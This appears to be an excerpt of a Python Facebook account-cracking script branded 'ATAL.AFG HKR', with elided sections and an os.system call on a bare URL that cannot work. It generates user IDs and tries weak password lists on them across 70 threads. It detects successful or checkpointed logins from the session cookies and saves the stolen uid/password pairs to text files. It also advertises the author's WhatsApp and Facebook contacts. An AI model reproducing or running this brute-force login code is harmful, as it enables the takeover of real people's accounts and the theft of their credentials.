...
os.system('xdg-open http://wa.me/+93789937452')
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('https://www.facebook.com/profile.php?id=100078856130872 ')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+93789937452?text=ATAL💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('https://www.facebook.com/profile.php?id=100078856130872 ');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'jamil123','Afghanking',' jamilking','visal123','100200']
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('ATAL.AFG HKR-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[ ATAL😓🤮]-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('ATAL.AFG HKR-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mATAL.AFG HKR\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
